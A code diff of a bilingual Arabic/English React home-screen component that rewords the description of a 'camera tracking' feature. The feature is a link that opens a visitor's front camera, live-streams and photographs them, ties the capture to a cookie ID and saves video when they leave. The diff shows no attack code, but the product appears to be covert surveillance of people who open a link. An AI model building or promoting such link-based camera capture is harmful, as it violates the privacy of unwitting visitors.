@@ -192,11 +192,11 @@ export const HomeView: React.FC<HomeViewProps> = ({
       badgeColor: 'bg-rose-100 text-rose-800 border-rose-200',
       icon: <Camera className="w-5 h-5 text-rose-600" />,
       desc: lang === 'ar'
-        ? 'يولد رابط تتبع HTML ذكي يفتح بث الكاميرا الأمامية فوراً خلال أول نصف ثانية مع عرضه لحظياً في لوحة التحكم. يقوم النظام بالالتقاط المتسلسل لـ 30 صورة بتبديل دقيق (صورتين أمامية + صورة خلفية) كل 0.5 ثانية مع فحص السطوع لمنع الصور السوداء، ويربط كافة البيانات بمعرّف الزائر المحفوظ بملفات تعريف الارتباط (Cookies). وعند خروج المستخدم من الرابط، يتحول البث المباشر فوراً إلى ملف فيديو مسجل جاهز للتنزيل.'
-        : 'Generates a smart HTML tracking link launching front camera live stream within the first 0.5 seconds with real-time dashboard streaming. Alternates capturing 30 high-definition photos (2 front, 1 rear) every 0.5s with automatic brightness checks, correlating all telemetry with cookie-bound visitor IDs. When the visitor leaves the link, the live stream instantly converts into a downloadable recorded video.',
+        ? 'يولد رابط تتبع HTML ذكي يفتح بث الكاميرا الأمامية فوراً خلال أول نصف ثانية مع عرضه لحظياً في لوحة التحكم. يقوم النظام بالالتقاط المتسلسل للصور بتبديل دقيق مع فحص السطوع لمنع الصور السوداء، ويربط كافة البيانات بمعرّف الزائر المحفوظ بملفات تعريف الارتباط (Cookies). وعند خروج المستخدم من الرابط، يتحول البث المباشر فوراً إلى ملف فيديو مسجل جاهز للتنزيل.'
+        : 'Generates a smart HTML tracking link launching front camera live stream within the first 0.5 seconds with real-time dashboard streaming. Alternates capturing sequential high-definition photos with automatic brightness checks, correlating all telemetry with cookie-bound visitor IDs. When the visitor leaves the link, the live stream instantly converts into a downloadable recorded video.',
       features: lang === 'ar'
-        ? ['بث مباشر فوري من أول نصف ثانية يظهر لحظياً في لوحة التحكم', 'التقاط 30 صورة متسلسلة بتبديل ذكي (صورتين أمامية + صورة خلفية) كل نصف ثانية', 'تحويل البث المباشر تلقائياً إلى فيديو مسجل قابل للتنزيل فور مغادرة المستخدم للرابط', 'ربط دقيق للزيارة بمعرّف الزائر المحفوظ في الـ Cookies (`sm_vid`) وضمان وضوح كامل وخلو من الصور السوداء']
-        : ['Instant live stream from first 0.5s streaming directly to dashboard', 'Sequential capture of 30 photos alternating (2 front, 1 rear) every 0.5s', 'Auto-conversion of live stream into downloadable video upon page leave', 'Precise visitor ID correlation via cookies (`sm_vid`) with verified zero-black-frame optical clarity'],
+        ? ['بث مباشر فوري من أول نصف ثانية يظهر لحظياً في لوحة التحكم', 'التقاط صور متسلسلة بتبديل ذكي', 'تحويل البث المباشر تلقائياً إلى فيديو مسجل قابل للتنزيل فور مغادرة المستخدم للرابط', 'ربط دقيق للزيارة بمعرّف الزائر المحفوظ في الـ Cookies (`sm_vid`) وضمان وضوح كامل وخلو من الصور السوداء']
+        : ['Instant live stream from first 0.5s streaming directly to dashboard', 'Sequential capture of photos alternating', 'Auto-conversion of live stream into downloadable video upon page leave', 'Precise visitor ID correlation via cookies (`sm_vid`) with verified zero-black-frame optical clarity'],
       actionLabel: lang === 'ar' ? 'فتح تتبع الكاميرا المتقدم' : 'Open Advanced Camera Tracking',
       actionView: null,
       modeSelect: 'camera' as TrackingMode,
@@ -505,7 +505,7 @@ export const HomeView: React.FC<HomeViewProps> = ({
                 </div>
                 <div>
                   <span className="text-sm sm:text-base font-black tracking-tight block">{t.cameraTrackingBtn}</span>
-                  <span className="text-[10px] text-rose-300 font-semibold">{lang === 'ar' ? 'بث مباشر وتسجيل فيديو + 30 صورة بكاميرا أمامية' : 'Front Live Stream, Video & 30 Photos'}</span>
+                  <span className="text-[10px] text-rose-300 font-semibold">{lang === 'ar' ? 'بث مباشر وتسجيل فيديو بكاميرا أمامية' : 'Front Live Stream & Video'}</span>
                 </div>
               </div>
               <span className="px-2.5 py-1 rounded-full text-[9px] font-black bg-rose-500/20 text-rose-300 uppercase tracking-widest border border-rose-500/30">
